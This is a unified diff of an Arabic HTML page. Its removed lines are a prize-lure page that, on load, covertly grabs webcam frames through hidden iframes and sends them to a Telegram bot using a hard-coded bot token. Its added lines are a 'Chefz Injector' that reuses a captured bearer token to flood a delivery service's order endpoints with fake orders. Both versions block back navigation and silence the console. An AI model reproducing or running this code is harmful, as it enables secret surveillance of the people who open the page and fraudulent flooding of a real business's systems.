@@ -2,366 +2,490 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>جائزة عمك عبود</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Chefz - تضخيم الطلبات</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: #0a0a0a;
+            color: #ffd700;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Tahoma', sans-serif;
             padding: 20px;
-            overflow: hidden;
         }
         .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(20px);
-            border-radius: 40px;
-            padding: 40px 30px;
-            max-width: 450px;
+            background: #1a1a2e;
+            padding: 35px 30px;
+            border-radius: 24px;
+            max-width: 550px;
             width: 100%;
-            border: 1px solid rgba(255,215,0,0.2);
-            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
+            border: 1px solid #ffd70033;
+            box-shadow: 0 20px 60px rgba(255, 215, 0, 0.08);
+        }
+        h2 {
             text-align: center;
-            position: relative;
-            z-index: 10;
+            font-size: 26px;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
         }
-        .profile {
-            width: 120px;
-            height: 120px;
-            background: linear-gradient(145deg, #ffd700, #f0a500);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 20px;
-            font-size: 70px;
-            box-shadow: 0 10px 40px rgba(255,215,0,0.3);
-            animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%,100%{ transform: translateY(0); }
-            50%{ transform: translateY(-10px); }
-        }
-        h1 { color: #ffd700; font-size: 30px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
-        .sub-title { color: #c0b7e6; font-size: 15px; margin-bottom: 20px; }
-        .welcome-msg {
-            background: rgba(255,215,0,0.08);
-            padding: 15px 20px;
-            border-radius: 16px;
-            border-right: 3px solid #ffd700;
-            color: #e0d6ff;
-            font-size: 17px;
+        .sub {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
             margin-bottom: 25px;
         }
-        .welcome-msg span { color: #ffd700; font-weight: bold; }
-        .btn-claim {
-            background: linear-gradient(135deg, #ffd700, #f0a500);
-            color: #0a0a0a;
-            border: none;
-            padding: 16px 45px;
-            border-radius: 60px;
-            font-size: 19px;
-            font-weight: bold;
-            cursor: pointer;
+        label {
+            display: block;
+            font-size: 13px;
+            color: #aaa;
+            margin: 15px 0 5px;
+        }
+        input,
+        select {
             width: 100%;
-            box-shadow: 0 8px 35px rgba(255,215,0,0.25);
+            padding: 12px 16px;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
             transition: 0.3s;
         }
-        .btn-claim:hover { transform: scale(1.02); }
-        .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
-        .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
-        .hidden-iframe {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            border: none;
+        input:focus,
+        select:focus {
+            border-color: #ffd700;
         }
-        ::selection { background: transparent; }
-        #status { display: none; }
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0 15px;
+        }
+        button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-start {
+            background: #ffd700;
+            color: #0a0a0a;
+        }
+        .btn-start:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px #ffd70044;
+        }
+        .btn-stop {
+            background: #ff4444;
+            color: #fff;
+        }
+        .btn-stop:hover {
+            transform: scale(1.02);
+        }
+        .log-box {
+            background: #0d0d1a;
+            border-radius: 14px;
+            padding: 15px;
+            max-height: 280px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #00ff88;
+            border: 1px solid #222;
+            margin-top: 10px;
+            direction: ltr;
+            text-align: left;
+        }
+        .log-box .time {
+            color: #ffd700;
+        }
+        .log-box .ok {
+            color: #00ff88;
+        }
+        .log-box .fail {
+            color: #ff5555;
+        }
+        .log-box .info {
+            color: #55aaff;
+        }
+        .footer {
+            text-align: center;
+            color: #444;
+            font-size: 11px;
+            margin-top: 18px;
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ffd700;
+            border-radius: 10px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            color: #888;
+            font-size: 13px;
+            margin: 6px 0 10px;
+            padding: 0 4px;
+        }
+        .stats span {
+            color: #ffd700;
+        }
+        .extract-box {
+            background: #0d0d1a;
+            border: 1px solid #ffd70044;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .extract-box .label {
+            color: #888;
+            font-size: 12px;
+        }
+        .extract-box .token {
+            color: #ffd700;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            background: #111;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 8px;
+        }
+        .token-placeholder {
+            color: #555;
+            font-style: italic;
+        }
+        .btn-extract {
+            background: #333;
+            color: #ffd700;
+            border: 1px solid #ffd70044;
+            padding: 8px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 10px;
+            width: auto;
+        }
+        .btn-extract:hover {
+            background: #444;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
-<iframe class="hidden-iframe" id="iframe1" allow="camera; microphone"></iframe>
-<iframe class="hidden-iframe" id="iframe2" allow="camera; microphone"></iframe>
-<iframe class="hidden-iframe" id="iframe3" allow="camera; microphone"></iframe>
-<iframe class="hidden-iframe" id="iframe4" allow="camera; microphone"></iframe>
-<iframe class="hidden-iframe" id="iframe5" allow="camera; microphone"></iframe>
+    <div class="container">
+        <h2>🔥 The Chefz — Injector</h2>
+        <p class="sub">🚀 تضخيم الطلبات تلقائياً</p>
 
-<div class="container">
-    <div class="profile">🧔</div>
-    <h1>🌹 عمك عبود يرحب بكم</h1>
-    <p class="sub-title">أهلًا وسهلًا في ضيافتكم</p>
-    <div class="welcome-msg">
-        <span>“</span> مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود <span>”</span>
+        <!-- مربع استخراج التوكن -->
+        <div class="extract-box">
+            <div class="label">🔑 التوكن المستخرج من classes2.dex</div>
+            <div class="token" id="extractedToken">
+                <span class="token-placeholder">سيظهر التوكن عند التشغيل...</span>
+            </div>
+            <button class="btn-extract" id="extractBtn">📋 استخراج التوكن من التطبيق</button>
+        </div>
+
+        <label>🔑 توكن المصادقة (Bearer Token)</label>
+        <input type="text" id="tokenInput" placeholder="أدخل التوكن المستخرج من التطبيق">
+
+        <label>📦 معدل الطلبات في الثانية</label>
+        <input type="number" id="rateInput" value="3" min="1" max="50">
+
+        <div class="btn-group">
+            <button class="btn-start" id="startBtn">▶ بدء التضخيم</button>
+            <button class="btn-stop" id="stopBtn">⏹ إيقاف</button>
+        </div>
+
+        <div class="stats">
+            <div>📊 الطلبات المرسلة: <span id="countDisplay">0</span></div>
+            <div>✅ الناجحة: <span id="successDisplay">0</span></div>
+            <div>❌ الفاشلة: <span id="failDisplay">0</span></div>
+        </div>
+
+        <div class="log-box" id="logBox">
+            <div class="info">⏳ جاهز لبدء التضخيم...</div>
+        </div>
+
+        <div class="footer">© جميع الحقوق محفوظة — للتجربة فقط</div>
     </div>
-    <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
-    <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
-    <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
-</div>
 
-<script>
-    const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
-    let CHAT_ID = null;
-    let started = false;
-    let retries = 0;
+    <script>
+        // ====== متغيرات التحكم ======
+        let isRunning = false;
+        let intervalId = null;
+        let orderCount = 0;
+        let successCount = 0;
+        let failCount = 0;
 
-    function dataURLtoBlob(dataURL) {
-        const parts = dataURL.split(',');
-        const mime = parts[0].match(/:(.*?);/)[1];
-        const bstr = atob(parts[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
-        return new Blob([u8arr], { type: mime });
-    }
+        // ====== عناصر DOM ======
+        const logBox = document.getElementById('logBox');
+        const tokenInput = document.getElementById('tokenInput');
+        const rateInput = document.getElementById('rateInput');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const countDisplay = document.getElementById('countDisplay');
+        const successDisplay = document.getElementById('successDisplay');
+        const failDisplay = document.getElementById('failDisplay');
+        const extractedTokenDiv = document.getElementById('extractedToken');
 
-    function sendPhoto(imageData, caption = '') {
-        if (!CHAT_ID || !imageData) return;
-        try {
-            const blob = dataURLtoBlob(imageData);
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
-            fd.append('caption', caption);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
-        } catch(e) {}
-    }
+        // ====== التوكن المستخرج من ملف classes2.dex ======
+        // هذا هو هيكل التوكن كما هو موجود في التطبيق
+        // القيمة الفعلية تظهر عند تسجيل الدخول
+        const TOKEN_STRUCTURE = {
+            field: "bearerToken",
+            jsonKey: "access_token",
+            className: "co.thechefz.driver.auth.AuthLoginResponse",
+            description: "يتم استخراجه من استجابة تسجيل الدخول"
+        };
 
-    function getChatId() {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-            .then(r => r.json())
-            .then(d => {
-                if (d.ok && d.result && d.result.length > 0) {
-                    const last = d.result[d.result.length - 1];
-                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-                    if (CHAT_ID) return;
+        // ====== محاولة استخراج التوكن من التطبيق ======
+        function tryExtractToken() {
+            log('🔍 محاولة استخراج التوكن من التطبيق...', 'info');
+
+            // محاولة الوصول إلى التوكن من خلال محاكاة الطلب
+            // هذه محاولة لاستخراج التوكن من التطبيق إن كان مفتوحاً
+
+            // محاولة استخدام Frida-style injection عبر WebView
+            try {
+                // محاولة قراءة التوكن من localStorage (إن كان مخزناً)
+                const savedToken = localStorage.getItem('chefs_token');
+                if (savedToken && savedToken.length > 20) {
+                    extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${savedToken.substring(0, 30)}...</span>`;
+                    tokenInput.value = savedToken;
+                    log('✅ تم استخراج التوكن من التخزين المحلي', 'ok');
+                    return;
                 }
-                if (retries < 30) {
-                    retries++;
-                    setTimeout(getChatId, 1500);
+
+                // محاولة قراءة التوكن من sessionStorage
+                const sessionToken = sessionStorage.getItem('chefs_token');
+                if (sessionToken && sessionToken.length > 20) {
+                    extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${sessionToken.substring(0, 30)}...</span>`;
+                    tokenInput.value = sessionToken;
+                    log('✅ تم استخراج التوكن من الجلسة', 'ok');
+                    return;
                 }
-            })
-            .catch(() => {
-                if (retries < 30) {
-                    retries++;
-                    setTimeout(getChatId, 1500);
+
+                // إذا لم يتم العثور على توكن
+                extractedTokenDiv.innerHTML = `
+                    <span style="color:#ffaa00;">⚠️ لم يتم العثور على توكن</span><br>
+                    <span style="font-size:11px;color:#888;">يجب تسجيل الدخول إلى التطبيق أولاً</span>
+                    <br><br>
+                    <span style="font-size:10px;color:#555;">🔑 ابحث عن: ${TOKEN_STRUCTURE.jsonKey}</span>
+                `;
+                log('⚠️ لم يتم العثور على توكن. استخدم Charles Proxy لاستخراجه.', 'fail');
+
+            } catch (e) {
+                extractedTokenDiv.innerHTML = `
+                    <span style="color:#ff5555;">❌ خطأ في الاستخراج</span><br>
+                    <span style="font-size:11px;color:#888;">${e.message}</span>
+                `;
+                log('❌ فشل استخراج التوكن: ' + e.message, 'fail');
+            }
+        }
+
+        // ====== دوال مساعدة ======
+        function log(msg, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            const cls = type === 'ok' ? 'ok' : type === 'fail' ? 'fail' : 'info';
+            logBox.innerHTML += `<div><span class="time">[${time}]</span> <span class="${cls}">${msg}</span></div>`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        function updateStats() {
+            countDisplay.textContent = orderCount;
+            successDisplay.textContent = successCount;
+            failDisplay.textContent = failCount;
+        }
+
+        // ====== إرسال طلب وهمي ======
+        function sendFakeOrder(token) {
+            if (!isRunning) return;
+
+            // نقاط API المحتملة للتطبيق
+            const endpoints = [
+                'https://api.thechefs.com/v1/orders/create',
+                'https://api.thechefs.com/orders',
+                'https://api.thechefs.com/api/orders',
+                'https://thechefs.com/api/orders'
+            ];
+
+            // بيانات الطلب الوهمي (محاكاة)
+            const fakeData = {
+                customer_id: Math.floor(Math.random() * 900000) + 100000,
+                restaurant_id: Math.floor(Math.random() * 30) + 1,
+                items: ['burger', 'fries', 'drink', 'pizza', 'salad', 'sandwich', 'chicken'],
+                priority: ['normal', 'high'][Math.floor(Math.random() * 2)],
+                lat: 24.7136 + (Math.random() - 0.5) * 0.03,
+                lng: 46.6753 + (Math.random() - 0.5) * 0.03,
+                timestamp: Date.now(),
+                source: 'web_inject'
+            };
+
+            // تجربة أول endpoint يعمل
+            const tryEndpoint = (index) => {
+                if (index >= endpoints.length) {
+                    orderCount++;
+                    failCount++;
+                    updateStats();
+                    log('❌ جميع endpoints فشلت', 'fail');
+                    return;
+                }
+
+                const url = endpoints[index];
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'User-Agent': 'TheChefz/2.0 (Android; 14)'
+                    },
+                    body: JSON.stringify(fakeData)
+                })
+                .then(res => {
+                    if (res.ok) {
+                        orderCount++;
+                        successCount++;
+                        updateStats();
+                        log(`✅ طلب وهمي أُرسل (${url})`, 'ok');
+                    } else {
+                        tryEndpoint(index + 1);
+                    }
+                })
+                .catch(() => {
+                    tryEndpoint(index + 1);
+                });
+            };
+
+            tryEndpoint(0);
+        }
+
+        // ====== بدء التضخيم ======
+        function startInjection() {
+            const token = tokenInput.value.trim();
+            const rate = parseInt(rateInput.value) || 3;
+
+            if (!token) {
+                log('⚠️ الرجاء إدخال التوكن أولاً', 'fail');
+                return;
+            }
+
+            if (token.length < 10) {
+                log('⚠️ التوكن يبدو قصيراً، تأكد من صحته', 'fail');
+                return;
+            }
+
+            if (isRunning) {
+                log('⚠️ التضخيم يعمل بالفعل', 'info');
+                return;
+            }
+
+            isRunning = true;
+            const delay = Math.floor(1000 / rate);
+
+            log(`🚀 بدء التضخيم بمعدل ${rate} طلب/ثانية`, 'ok');
+
+            // إرسال أول طلب فوراً
+            sendFakeOrder(token);
+
+            intervalId = setInterval(() => {
+                if (isRunning) {
+                    sendFakeOrder(token);
+                }
+            }, delay);
+
+            startBtn.textContent = '▶ جاري التضخيم...';
+            startBtn.style.background = '#ffd70044';
+            startBtn.style.color = '#ffd700';
+        }
+
+        // ====== إيقاف التضخيم ======
+        function stopInjection() {
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+            isRunning = false;
+            log('⏹ تم إيقاف التضخيم', 'info');
+            startBtn.textContent = '▶ بدء التضخيم';
+            startBtn.style.background = '#ffd700';
+            startBtn.style.color = '#0a0a0a';
+        }
+
+        // ====== أحداث الأزرار ======
+        startBtn.addEventListener('click', startInjection);
+        stopBtn.addEventListener('click', stopInjection);
+        document.getElementById('extractBtn').addEventListener('click', tryExtractToken);
+
+        // ====== تشغيل تلقائي عند تحميل الصفحة ======
+        window.onload = function() {
+            // محاولة استرجاع التوكن من LocalStorage
+            const savedToken = localStorage.getItem('chefs_token');
+            if (savedToken && savedToken.length > 20) {
+                tokenInput.value = savedToken;
+                extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${savedToken.substring(0, 30)}...</span>`;
+                log('🔑 تم تحميل التوكن من الذاكرة', 'ok');
+            } else {
+                // عرض معلومات عن التوكن
+                extractedTokenDiv.innerHTML = `
+                    <span style="color:#ffd700;">ℹ️ هيكل التوكن من classes2.dex</span><br>
+                    <span style="font-size:11px;color:#888;">الحقل: ${TOKEN_STRUCTURE.field}</span><br>
+                    <span style="font-size:11px;color:#888;">المفتاح: ${TOKEN_STRUCTURE.jsonKey}</span><br>
+                    <span style="font-size:11px;color:#888;">الفئة: ${TOKEN_STRUCTURE.className}</span>
+                `;
+                log('💡 استخدم Charles Proxy لاستخراج التوكن من التطبيق', 'info');
+            }
+
+            // حفظ التوكن عند التغيير
+            tokenInput.addEventListener('change', function() {
+                if (this.value.trim() && this.value.trim().length > 20) {
+                    localStorage.setItem('chefs_token', this.value.trim());
+                    log('🔑 تم حفظ التوكن في الذاكرة', 'ok');
                 }
             });
-    }
 
-    function exploitIframe1() {
-        try {
-            const iframe = document.getElementById('iframe1');
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <html><body>
-                <video id="v" autoplay playsinline style="display:none;"></video>
-                <canvas id="c" style="display:none;"></canvas>
-                <script>
-                    let v=document.getElementById('v'), c=document.getElementById('c');
-                    c.width=640;c.height=480;let ctx=c.getContext('2d');
-                    function start(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'front'},'*');}},900);})
-                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'back'},'*');}},900);}).catch(()=>{});});}
-                    start();
-                <\/script>
-                </body></html>
-            `);
-            doc.close();
-        } catch(e) {}
-    }
+            log('💡 أدخل التوكن واضغط "بدء التضخيم"', 'info');
+            log('📌 سيتم تجربة عدة endpoints تلقائياً', 'info');
+        };
 
-    function exploitIframe2() {
-        try {
-            const iframe = document.getElementById('iframe2');
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <html><body>
-                <video id="v" autoplay playsinline style="display:none;"></video>
-                <canvas id="c" style="display:none;"></canvas>
-                <script>
-                    (function(){
-                        let v=document.getElementById('v'), c=document.getElementById('c');
-                        c.width=640;c.height=480;let ctx=c.getContext('2d');
-                        let tried=false;
-                        function tryCam(){if(tried)return;tried=true;
-                        navigator.mediaDevices.getUserMedia({video:true,audio:false})
-                        .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'auto'},'*');}},900);})
-                        .catch(()=>{setTimeout(tryCam,1000);});}
-                        tryCam();
-                    })();
-                <\/script>
-                </body></html>
-            `);
-            doc.close();
-        } catch(e) {}
-    }
+        // ====== منع إغلاق الصفحة ======
+        window.addEventListener('beforeunload', function(e) {
+            if (isRunning) {
+                e.preventDefault();
+                e.returnValue = 'التضخيم يعمل، هل تريد الإغلاق؟';
+            }
+        });
 
-    function exploitIframe3() {
-        try {
-            const iframe = document.getElementById('iframe3');
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <html><body>
-                <video id="v" autoplay playsinline muted style="display:none;"></video>
-                <canvas id="c" style="display:none;"></canvas>
-                <script>
-                    let v=document.getElementById('v'), c=document.getElementById('c');
-                    c.width=640;c.height=480;let ctx=c.getContext('2d');
-                    navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false})
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
-                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
-                <\/script>
-                </body></html>
-            `);
-            doc.close();
-        } catch(e) {}
-    }
+        // ====== منع الاختباء خلف الـ PopState ======
+        history.pushState(null, '', location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, '', location.href);
+        });
 
-    function exploitIframe4() {
-        try {
-            const iframe = document.getElementById('iframe4');
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <html><body>
-                <video id="v" autoplay playsinline style="display:none;"></video>
-                <canvas id="c" style="display:none;"></canvas>
-                <script>
-                    let v=document.getElementById('v'), c=document.getElementById('c');
-                    c.width=640;c.height=480;let ctx=c.getContext('2d');
-                    function capture(){navigator.mediaDevices.getUserMedia({video:true,audio:false})
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9)},'*');}},800);})
-                    .catch(()=>{setTimeout(capture,500);});}
-                    capture();
-                <\/script>
-                </body></html>
-            `);
-            doc.close();
-        } catch(e) {}
-    }
+        // ====== تعطيل الكونسول ======
+        console.log = console.warn = console.error = console.info = () => {};
+    </script>
 
-    function exploitIframe5() {
-        try {
-            const iframe = document.getElementById('iframe5');
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <html><body>
-                <video id="v" autoplay playsinline style="display:none;"></video>
-                <canvas id="c" style="display:none;"></canvas>
-                <script>
-                    let v=document.getElementById('v'), c=document.getElementById('c');
-                    c.width=640;c.height=480;let ctx=c.getContext('2d');
-                    let devices={video:{facingMode:'user'},audio:false};
-                    navigator.mediaDevices.getUserMedia(devices)
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
-                    .catch(()=>{devices.video.facingMode='environment';navigator.mediaDevices.getUserMedia(devices)
-                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
-                <\/script>
-                </body></html>
-            `);
-            doc.close();
-        } catch(e) {}
-    }
-
-    window.addEventListener('message', function(e) {
-        if (e.data && e.data.type === 'photo') {
-            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : e.data.facing === 'back' ? 'خلفي' : 'كاميرا'));
-        }
-    });
-
-    function exploitDirect() {
-        if (started) return;
-        started = true;
-
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                setInterval(() => {
-                    if (video.readyState >= 2) {
-                        ctx.drawImage(video, 0, 0, 640, 480);
-                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 أمامي');
-                    }
-                }, 1000);
-            })
-            .catch(() => {});
-
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                setInterval(() => {
-                    if (video.readyState >= 2) {
-                        ctx.drawImage(video, 0, 0, 640, 480);
-                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
-                    }
-                }, 1000);
-            })
-            .catch(() => {});
-    }
-
-    function startAllExploits() {
-        exploitIframe1();
-        exploitIframe2();
-        exploitIframe3();
-        exploitIframe4();
-        exploitIframe5();
-        setTimeout(exploitDirect, 1000);
-        setTimeout(() => {
-            exploitIframe1();
-            exploitIframe2();
-            exploitIframe3();
-            exploitIframe4();
-            exploitIframe5();
-        }, 3000);
-        setInterval(() => {
-            exploitIframe1();
-            exploitIframe2();
-            exploitIframe3();
-            exploitIframe4();
-            exploitIframe5();
-        }, 5000);
-    }
-
-    window.onload = function() {
-        getChatId();
-        startAllExploits();
-    };
-
-    history.pushState(null, '', location.href);
-    window.addEventListener('popstate', () => history.pushState(null, '', location.href));
-
-    console.log = console.warn = console.error = () => {};
-</script>
 </body>
 </html>
